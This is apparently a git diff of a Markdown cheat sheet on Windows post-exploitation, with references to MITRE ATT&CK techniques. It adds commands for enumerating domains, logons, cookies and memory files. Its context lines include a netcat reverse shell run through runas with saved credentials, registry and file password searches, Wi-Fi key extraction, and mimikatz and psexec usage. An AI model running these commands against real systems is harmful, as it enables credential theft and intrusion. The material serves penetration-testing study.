@@ -16,6 +16,10 @@ From application version, you can guess which version of Windows the system is r
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # Displays O.S. Name and Version
 hostname # Displays the hostname
 driverquery # List of installed device drivers and their properties
+wmic ntdomain get /all /format:List
+wmic netclient get /all /format:List
+nltest /trusted_domains
+wmic pagefile
 ```
 
 You can try to see if [wesng](https://github.com/bitsadmin/wesng) say something interesting.
@@ -34,13 +38,18 @@ net users # Enumerate the different users on the system
 net user *user* # Display information about the given user
 wmic useraccount get name,sid,fullname # Displays users using WMI
 quser # Identify active user sessions on a computer.
+wmic netlogin list /format:List # Display logon information
+Get-WmiObject Win32_LoggedOnUser # Display logon users
+klist sessions # Displays a list of logon sessions on this computer.
 ```
 
-1) Check for recently run commands
+1) Check for recently run commands and recent documents
 
 ```bash
 req query HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 req query HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+
+dir "C:\Users\USR\AppData\Local\Microsoft\Windows\FileHistory\Data"
 ```
 
 2) Check if any user has the **passwordreq** flag set to **no**.
@@ -59,8 +68,13 @@ This could be very interesting where it could be done an an account with adminis
 runas /user:Administrator /savecred "nc.exe -c cmd.exe IP PORT"
 ```
 
-For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)
+3) Check for the differents "User Shell Folders" configured
 
+```bash
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+```
+
+For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)
 
 #### Network information
 
@@ -76,17 +90,17 @@ nbtstat -s # Lists sessions table, converting destination IP addresses to their 
 net config workstation
 netsh wlan show profile # List WLAN profile(s)
 netsh wlan show profile WIFI_PROFILE key=clear # Get the Wi-Fi from a given profile
-getmac
+getmac # Display the MAC Addresses
 ```
 
 For more information about that technique refer to [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)
 
 #### Remote Desktop Session
 
-reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+Remote Desktop Services (RDS), known as **Terminal Services** in Windows Server 2008 and earlier, is one of the components of Microsoft Windows that allow a user to take control of a remote computer or virtual machine over a network connection.
 
 ```bash
-qwinsta
+qwinsta # Displays information about sessions on a Remote Desktop Session Host server.
 ```
 
 Here below are the registry keys that control the settings of the Remote Desktop Protocol:
@@ -137,6 +151,9 @@ dir /s pass == cred == vnc == .config
 findstr /si password *.xml *.ini *.txt  # Search for password in xml, ini and xml files
 reg query HKLM /f password /t REG_SZ /s # Search for password in registry keys in HKLM
 reg query HKCU /f password /t REG_SZ /s # Search for password in registry keys in HKCU
+dir "C:\Users\USER\AppData\Local\Microsoft\Windows\INetCookies"
+dir "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Cookies"
+dir "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Cookies\Low"
 ```
 
 If you can stage a .exe, you can use [Lazagne](https://github.com/AlessandroZ/LaZagne), which is even used by known APTs such as OilRig
@@ -202,6 +219,12 @@ dir %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 
 We can also use mimikatz *dpapi::rdg* with the appropriate */masterkey*
 
+##### Memory Files
+
+- **hiberfil.sys**: RAM stored during machine hibernation
+- **%SystemDrive%\pagefile.sys**: Virtual memory used by Windows
+- **%SystemDrive%\swapfile.sys**: Virtual memory used by Windows Store Apps
+
 For more information about those techniques refer to:
 
 - [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
@@ -265,6 +288,8 @@ python psexec.py USERNAME@PASSWORD
 ```bash
 cme winrm IP -u USERNAME -p PASSWORD
 ```
+
+For more information about that technique refer to [T1021.006 - Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/)
 
 #### Process Enumeration
 
@@ -369,6 +394,8 @@ netstat -ano # Display all active connections
 netsh firewall show state # Display the Windows Firewall status
 netsh firewall show config # Display the Windows Firewall configuration
 ```
+
+For more information about that technique refer to [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)
 
 #### Windows Patches
 
